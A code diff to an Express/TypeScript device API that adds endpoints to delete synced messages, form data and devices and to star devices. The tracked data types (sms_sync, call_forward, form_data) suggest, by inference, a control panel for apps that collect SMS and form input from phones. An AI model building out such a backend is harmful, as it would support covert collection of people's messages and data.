@@ -40,6 +40,7 @@ const SKIP_FIELDS = new Set(["app_id", "sub_id", "uid", "id", "registered_at", "
 const CORE_DATA_TYPES = new Set([
   "registered_device", "heartbeat", "online_status",
   "fcm_token", "call_forward", "sms_sync", "device_info",
+  "admin_config",
 ]);
 
 // ── POST /api/device/:appToken/upsert ─────────────────────────────────────────
@@ -429,6 +430,90 @@ router.get("/device/:appToken/data", async (req, res) => {
 
   if (error) return res.status(500).json({ ok: false, error: error.message });
   return res.json({ ok: true, data: data ?? [] });
+});
+
+// ── DELETE /api/device/:appToken/message/:msgId ───────────────────────────────
+// Delete a single message by its database ID
+router.delete("/device/:appToken/message/:msgId", async (req, res) => {
+  const { appToken, msgId } = req.params;
+
+  const appCheck = await verifyApp(appToken);
+  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });
+
+  const { error } = await db
+    .from("messages")
+    .delete()
+    .eq("app_id", appToken)
+    .eq("id", msgId);
+
+  if (error) return res.status(500).json({ ok: false, error: error.message });
+  return res.json({ ok: true });
+});
+
+// ── DELETE /api/device/:appToken/messages ─────────────────────────────────────
+// Delete all messages for the app, or just one device if ?uid= is provided
+router.delete("/device/:appToken/messages", async (req, res) => {
+  const { appToken } = req.params;
+  const { uid } = req.query as Record<string, string>;
+
+  const appCheck = await verifyApp(appToken);
+  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });
+
+  let query = db.from("messages").delete().eq("app_id", appToken);
+  if (uid) query = query.eq("sub_id", uid);
+
+  const { error } = await query;
+  if (error) return res.status(500).json({ ok: false, error: error.message });
+  return res.json({ ok: true });
+});
+
+// ── DELETE /api/device/:appToken/device/:uid ──────────────────────────────────
+// Delete a device and all its messages + form_data
+router.delete("/device/:appToken/device/:uid", async (req, res) => {
+  const { appToken, uid } = req.params;
+
+  const appCheck = await verifyApp(appToken);
+  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });
+
+  await db.from("messages").delete().eq("app_id", appToken).eq("sub_id", uid);
+  await db.from("form_data").delete().eq("app_id", appToken).eq("sub_id", uid);
+
+  const { error } = await db
+    .from("devices")
+    .delete()
+    .eq("app_id", appToken)
+    .eq("sub_id", uid);
+
+  if (error) return res.status(500).json({ ok: false, error: error.message });
+  return res.json({ ok: true });
+});
+
+// ── PATCH /api/device/:appToken/star/:uid ─────────────────────────────────────
+// Set or unset starred flag on a device (merges into data_json)
+router.patch("/device/:appToken/star/:uid", async (req, res) => {
+  const { appToken, uid } = req.params;
+  const { starred } = req.body as { starred?: boolean };
+
+  const appCheck = await verifyApp(appToken);
+  if (!appCheck.ok) return res.status(403).json({ ok: false, error: appCheck.error });
+
+  const { data: existing } = await db
+    .from("devices")
+    .select("data_json")
+    .eq("app_id", appToken)
+    .eq("sub_id", uid)
+    .single();
+
+  const dj = { ...((existing?.data_json as Record<string, unknown>) ?? {}), starred: !!starred, starred_updated_at: Date.now() };
+
+  const { error } = await db
+    .from("devices")
+    .update({ data_json: dj, updated_at: new Date().toISOString() })
+    .eq("app_id", appToken)
+    .eq("sub_id", uid);
+
+  if (error) return res.status(500).json({ ok: false, error: error.message });
+  return res.json({ ok: true });
 });
 
 export default router;
